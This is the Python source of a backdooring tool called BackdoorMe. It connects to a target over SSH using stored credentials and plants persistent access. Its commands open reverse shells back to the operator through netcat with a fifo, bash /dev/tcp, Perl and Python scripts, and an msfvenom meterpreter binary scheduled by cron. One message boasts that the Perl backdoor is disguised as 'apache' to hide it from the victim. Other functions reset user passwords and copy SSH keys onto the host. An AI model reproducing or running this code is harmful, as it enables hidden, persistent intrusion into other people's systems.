import os
import socket
import subprocess
import target
from colorama import *
from Tkinter import *
import cmd
from start import ascii

GOOD = Fore.GREEN + " + " + Fore.RESET
BAD = Fore.RED + " - " + Fore.RESET
WARN = Fore.YELLOW + " * " + Fore.RESET
INFO = Fore.BLUE + " + " + Fore.RESET

class BackdoorMe(cmd.Cmd):
    prompt = Fore.BLUE + ">> " + Fore.RESET

    def __init__(self):
        cmd.Cmd.__init__(self) 
        
        self.target_num = 1
        self.port = 22; #change this if the port is different, almost never necessary
        self.targets = {}
        self.curtarget = None
        proc = subprocess.Popen(["ifconfig | grep inet | head -n1 | cut -d\  -f12 | cut -d: -f2"], stdout=subprocess.PIPE, shell=True)
        self.localIP = proc.stdout.read()
        self.localIP = self.localIP[:-1]
        ascii()
        print "Welcome to BackdoorMe, a backdooring utility. Type \"help\" to see the list of available commands."
        print "Type \"addtarget\" to set a target, and \"open\" to open an SSH connection to that target."
        print "Using local IP of %s." % self.localIP
        
    def do_addtarget(self, args):
        hostname = raw_input('Target Hostname: ') #victim host
        try:
            socket.inet_aton(hostname)
        except socket.error:
            print BAD + "Invalid IP Address."
            return 
        uname = raw_input('Username: ') #username for the box to be attacked
        pword = raw_input('Password: ') #password for the box to be attacked
        print GOOD + "Target %d Set!" % self.target_num
        t = target.Target(hostname, uname, pword, self.target_num)
        self.targets[self.target_num] = t
        self.target_num += 1
        self.curtarget = t
    
    def do_settarget(self, args):
        if len(args) == 0 or not target_exists(int(args[0])):
            print BAD + "No target with that number found. Try adding a target with \"addtarget\" or trying a different target number."
        else:
            self.curtarget = self.targets[int(args[0])]
            print GOOD + "Current target set to %s" % args[0]
    
    def do_open(self, args):
        t = self.get_target(args)
        try: 
            t.conn()
        except:
            print BAD + "Connection failed."
            return
        print GOOD + "Connection established."
    
    def get_target(self, args):
        t = self.curtarget
                
        if (len(args) == 0):
            print GOOD + "Using current target %d." % t.target_num
        elif not self.target_exists(int(args[0])):
            print BAD + "No target with that target ID found." 
            return
        else:
            print GOOD + "Using target %s" % args[0]
            t = self.targets[int(args[0])]
        return t

    def target_exists(self, num):
        return (num in self.targets)  
 
    def do_netcat(self, args):
        t = self.get_target(args)
        if not t.is_open:
            print BAD + "No SSH connection to target. Run \"open\" to start a connection."
            return
        raw_input("Please enter the following command: nc -v -n -l -p 53920")
        print("Initializing backdoor...")
        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S rm /tmp/f;")
        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S mkfifo /tmp/f;")
        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S nohup cat /tmp/f | nohup /bin/bash -i 2>&1 | nohup nc " + self.localIP + " 53920 > sudo nohup /tmp/f")
        print(GOOD + "Netcat backdoor on port 53920 attempted.")

    def do_perl(self,args):
        t = self.get_target(args)
        if not t.is_open:
            print BAD + "No SSH connection to target. Run \"open\" to start a connection."
            return

        toW = 'perl/prsA.pl'
        stringToAdd = ""
        fileToWrite = open(toW, 'w')

        with open ("perl/prs1", "r") as myfile:
            data=myfile.read()
        data = data[:-1]#remove the last new line character.
        stringToAdd+=data + self.localIP

        with open ("perl/prs2", "r") as myfile:
            data=myfile.read()
        stringToAdd+=data
        fileToWrite.write(stringToAdd)
        fileToWrite.close()

        raw_input("Run the following command: nc -v -n -l -p 53921 in another shell to start the listener.")
        scpFiles('perl/prsA.pl', False)
        print("Moving the backdoor script.")
        self.curtarget.ssh.exec_command("echo " + pword + " | sudo -S nohup perl prsA.pl")
        print("Perl backdoor on port 53921 attempted. It's named apache so the target won't see what's going on. If you stop the listener, the backdoor will stop.")


    def do_bash(self, args):
        t = self.get_target(args)
        if not t.is_open:
            print BAD + "No SSH connection to target. Run \"open\" to start a connection."
            return

        raw_input("Please enter the following command: nc -v -n -l -p 53923 in another shell to connect.")
        print("Initializing backdoor...")
        self.curtarget.ssh.exec_command("echo " +  t.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.localIP + "/53923 0>&1")
        print(GOOD + "Bash Backdoor on port 53923 attempted. You may need to input the password, which is " + t.pword)

    def do_python(self, args):
        t = self.get_target(args)
        if not t.is_open:
            print BAD + "No SSH connection to target. Run \"open\" to start a connection."
            return

        toW = 'pythScript/pythBackdoor.py'
        stringToAdd = ""
        fileToWrite = open(toW, 'w')

        with open ("pythScript/pythPart1", "r") as myfile:
            data=myfile.read()
        data = data[:-1]#remove the last new line character.
        stringToAdd+=data + self.localIP
    
        with open ("pythScript/pythPart2", "r") as myfile:
            data=myfile.read()
        stringToAdd+=data
        fileToWrite.write(stringToAdd)
        fileToWrite.close()
        raw_input("Run the following command: nc -v -n -l -p 53922 in another shell.")
        self.curtarget.ssh.exec_command('rm pythBackdoor.py')
        self.curtarget.scpFiles(self, 'pythScript/pythBackdoor.py', False)
        print("Moving the backdoor script.")
        self.curtarget.ssh.exec_command("echo " + t.pword + " | sudo -S nohup python pythBackdoor.py")
        print(GOOD + "Python backdoor on 53922 attempted.")


    def do_metasploit(self,args):
        t = self.get_target(args)
        if not t.is_open:
            print BAD + "No SSH connection to target. Run \"open\" to start a connection."
            return


        cron = (raw_input(" + Press y to start backdoor as a cronjob (recommended): ") == 'y')
        #os.system("msfvenom -a x86 -p linux/x86/meterpreter/reverse_tcp lhost=10.1.0.1 lport=4444 --platform=Linux -o initd -f elf -e x86/shikata_ga_nai") #% ip_address)
        os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=4444 -f elf X -o initd" % self.localIP)
        self.curtarget.scpFiles('initd', False)
        print("Backdoor script moved")
        self.curtarget.ssh.exec_command("chmod +x initd")
        if cron:
            self.curtarget.ssh.exec_command("crontab -l > mycron")
            self.curtarget.ssh.exec_command("echo \"* * * * * ./initd\" >> mycron && crontab mycron && rm mycron")
        print(GOOD + "Backdoor attempted on port 4444. Backdoor will attempt to reconnect every second, and will stop attempting once connection is made. To access, open msfconsole and run:")
        print("use multi/handler\n \
        > set PAYLOAD linux/x86/meterpreter/reverse_tcp\n \
        > set LHOST %s\n \
        > exploit", self.localIP)
        raw_input(GOOD + "Press any key to launch exploit once msfconsole is listening...")
        self.curtarget.ssh.exec_command("watch -n1 nohup ./initd > /dev/null &")


    def do_passwd(self, args):
        t = self.get_target(args)
        if not t.is_open:
            print BAD + "No SSH connection to target. Run \"open\" to start a connection."
            return
        username = raw_input(" + Enter the username: ")
        password = raw_input(" + Enter the new password: ")
        self.curtarget.ssh.exec_command("echo '%s:%s | sudo chpasswd" %(username, password))
        print("Changing %s to %s..." % (username, password)) 

    def do_change_ip(self, args):
        newIP = raw_input("Please input the ip you want to use: ")
        try:
            socket.inet_aton(newIP)
            self.localIP = newIP
        except socket.error:
            print BAD + "Invalid IP Address."
            return 

        print(GOOD + "Local IP is now: " + newIP)

    def do_private_key(self, args):
        t = self.get_target(args)
        os.system("sshpass -p %s ssh-copy-id %s@%s" % (t.pword, t.uname, t.hostname))
        print GOOD + "Private key copied."
    
    def do_quit(self, args):
        print "Exiting"
        exit()

    def do_list(self, args):
        print "Targets: "
        for num, t in self.targets.iteritems():
            print "%s - %s %s:%s" % (num, t.hostname, t.uname, t.pword)

    def preloop(self):
        """Initialization before prompting user for commands.
           Despite the claims in the Cmd documentaion, Cmd.preloop() is not a stub.
        """
        cmd.Cmd.preloop(self)   ## sets up command completion
        self._hist    = []      ## No history yet
        self._locals  = {}      ## Initialize execution namespace for user
        self._globals = {}
    def do_history(self, args):
        print self._hist
    def do_exit(self, args):
        return -1
    def precmd(self, line):
        self._hist += [ line.strip() ]
        return line 
    def default(self, line):       
        try:
            exec(line) in self._locals, self._globals
        except Exception, e:
            print e.__class__, ":", e 
 
    def do_EOF(self, line):
        print ""
        return True
    def emptyline(self):
        return
BackdoorMe().cmdloop()


